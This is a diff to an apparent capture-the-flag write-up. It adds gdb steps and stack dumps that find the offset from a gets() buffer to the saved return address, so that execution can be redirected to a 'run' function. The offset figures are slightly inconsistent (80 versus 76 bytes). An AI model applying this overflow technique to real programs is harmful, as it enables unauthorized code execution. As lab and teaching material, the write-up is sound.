@@ -48,6 +48,36 @@ Stack level 0, frame at 0xbffff730:
 ```
 - **Notice we got the current stack frame and the previous one in `saved eip 0x64636261`**
 
+- We can stop the execution of the program right after the gets using the break "b \*0x8048495". it is right after the return of the gets function meaning we can observe the start of the string copied on the stack and calculate the offset to the saved eip (it is the address of the return function)
+
+```bash
+Starting program: /home/user/level1/level1 
+aaaa
+
+Breakpoint 1, 0x08048495 in main ()
+(gdb) x/40x $sp
+0xbffff6e0:	0xbffff6f0	0x0000002f	0xbffff73c	0xb7fd0ff4
+0xbffff6f0:	0x61616161	0x08049700	0x00000001	0x08048321
+0xbffff700:	0xb7fd13e4	0x00000016	0x0804978c	0x080484c1
+0xbffff710:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
+0xbffff720:	0xb7fed280	0x00000000	0x080484a9	0xb7fd0ff4
+0xbffff730:	0x080484a0	0x00000000	0x00000000	0xb7e454d3
+0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xb7fdc858
+0xbffff750:	0x00000000	0xbffff71c	0xbffff7dc	0x00000000
+0xbffff760:	0x08048230	0xb7fd0ff4	0x00000000	0x00000000
+0xbffff770:	0x00000000	0xc319e73d	0xf45e432d	0x00000000
+(gdb) info frame
+Stack level 0, frame at 0xbffff740:
+ eip = 0x8048495 in main; saved eip 0xb7e454d3
+ Arglist at 0xbffff738, args: 
+ Locals at 0xbffff738, Previous frame's sp is 0xbffff740
+ Saved registers:
+  ebp at 0xbffff738, eip at 0xbffff73c
+(gdb) 
+```
+
+- we calculated that there is a distance of 80 Byte between start of input and saved *eip* meaning we need to input 76 Byte of filling string and then address of `run` function (make attention to endianess of system)
+
 
 
 - We going to overwrite the return of main function to jump on the `run` function
